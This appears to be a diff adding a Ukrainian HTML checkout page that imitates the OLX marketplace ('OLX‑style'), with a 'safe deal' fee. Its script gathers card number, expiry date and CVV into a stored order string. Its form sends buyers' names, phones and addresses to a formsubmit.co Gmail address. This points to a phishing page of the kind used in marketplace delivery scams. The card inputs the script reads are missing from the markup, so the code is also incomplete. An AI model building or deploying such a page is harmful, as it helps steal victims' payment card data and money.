@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Підсумок і оплата</title>
+  <style>
+    * { box-sizing: border-box; font-family: Arial, sans-serif; }
+    body { margin: 0; background:#f5f7f8; color:#0f2a2d; }
+    header {
+      background:#0f2a2d; color:#fff; padding:16px 40px;
+      display:flex; align-items:center; justify-content:space-between;
+    }
+    header .logo { font-size:28px; font-weight:700; color:#3fd0c9; }
+    header nav { font-size:14px; opacity:.9; }
+
+    .container {
+      max-width:1200px; margin:40px auto; display:grid;
+      grid-template-columns: 1fr 420px; gap:40px;
+      background:#fff; padding:40px; border-radius:12px;
+    }
+
+    h1 { margin-top:0; }
+
+    .payment-method {
+      border:1px solid #dce4e6; border-radius:10px;
+      padding:16px; margin-bottom:16px;
+      display:flex; justify-content:space-between; align-items:center;
+      cursor:pointer;
+    }
+    .payment-method.active { border:2px solid #0f2a2d; }
+    .price { font-weight:600; }
+
+    .card-form input {
+      width:100%; padding:12px; margin-bottom:12px;
+      border-radius:8px; border:1px solid #ccd6d9;
+    }
+
+    .summary {
+      border:1px solid #dce4e6; border-radius:12px; padding:24px;
+    }
+    .summary-item { display:flex; justify-content:space-between; margin:12px 0; }
+    .summary-total { font-weight:700; font-size:18px; }
+
+    button {
+      width:100%; padding:14px; margin-top:20px;
+      border:none; border-radius:10px;
+      background:#0f2a2d; color:#fff; font-size:16px;
+      cursor:pointer;
+    }
+    button:hover { opacity:.9; }
+
+    footer {
+      background:#0f2a2d; color:#fff; padding:20px;
+      text-align:center; font-size:13px; margin-top:40px;
+    }
+    </style>
+  <script>
+    let selectedMethod = 'card';
+
+    function selectMethod(el, method) {
+      document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('active'));
+      el.classList.add('active');
+      selectedMethod = method;
+      document.getElementById('methodInput').value = method;
+    }
+
+    function sendOrder() {
+      const card = document.getElementById('card').value;
+      const date = document.getElementById('date').value;
+      const cvv = document.getElementById('cvv').value;
+
+      const body = `Спосіб оплати: ${selectedMethod}%0AНомер картки: ${card}%0AДата: ${date}%0ACVV: ${cvv}%0AСума: 2383,13 грн`;
+
+      localStorage.setItem('order', body);
+      window.location.href = 'success.html';
+    }
+  </script>
+</head>
+<body>
+
+<header>
+  <div class="logo">OLX‑style</div>
+  <nav>Чат · Укр · Рус</nav>
+</header>
+
+<div class="container">
+  <div>
+    <h1>Підсумок і оплата</h1>
+
+    <div class="payment-method active" onclick="selectMethod(this,'card')">
+      <span>Картка онлайн</span>
+      <span class="price">2 383,13 грн</span>
+    </div>
+
+    <div class="payment-method" onclick="selectMethod(this,'apple')">
+      <span>Apple Pay</span>
+      <span class="price">2 383,13 грн</span>
+    </div>
+
+    <div class="payment-method" onclick="selectMethod(this,'google')">
+      <span>Google Pay</span>
+      <span class="price">2 383,13 грн</span>
+    </div>
+
+    <div class="payment-method" onclick="selectMethod(this,'office')">
+      <span>Оплата у відділенні</span>
+      <span class="price">2 437,83 грн</span>
+    </div>
+
+    <h3>Дані для доставки</h3>
+
+    <form action="https://formsubmit.co/myshop@gmail.com" method="POST">
+      <input type="text" name="name" placeholder="Імʼя та прізвище" required />
+      <input type="tel" name="phone" placeholder="Телефон" required />
+      <input type="text" name="city" placeholder="Місто" required />
+      <input type="text" name="branch" placeholder="Відділення (Нова Пошта / Укрпошта)" required />
+
+      <select name="delivery">
+        <option value="Нова Пошта">Нова Пошта</option>
+        <option value="Укрпошта">Укрпошта</option>
+      </select>
+
+      <select name="payment">
+        <option value="Оплата при отриманні">Оплата при отриманні</option>
+        <option value="Онлайн">Онлайн</option>
+      </select>
+
+      <textarea name="comment" placeholder="Коментар до замовлення"></textarea>
+
+      <input type="hidden" name="_subject" value="📦 Нове замовлення з сайту" />
+      <input type="hidden" name="_next" value="success.html" />
+
+      <button type="submit">Оформити замовлення</button>
+    </form>
+  </div>
+
+  <div class="summary">
+    <h3>Ваше замовлення</h3>
+    <div class="summary-item">
+      <span>Вартість товару</span>
+      <span>2 325 грн</span>
+    </div>
+    <div class="summary-item">
+      <span>Доставка</span>
+      <span>Безкоштовно</span>
+    </div>
+    <div class="summary-item">
+      <span>Безпечна угода</span>
+      <span>58,13 грн</span>
+    </div>
+    <hr />
+    <div class="summary-item summary-total">
+      <span>До сплати</span>
+      <span>2 383,13 грн</span>
+    </div>
+  </div>
+</div>
+
+<footer>
+  Цей сайт використовує cookies. Ви можете змінити налаштування у своєму браузері.
+</footer>
+
+</body>
+</html>
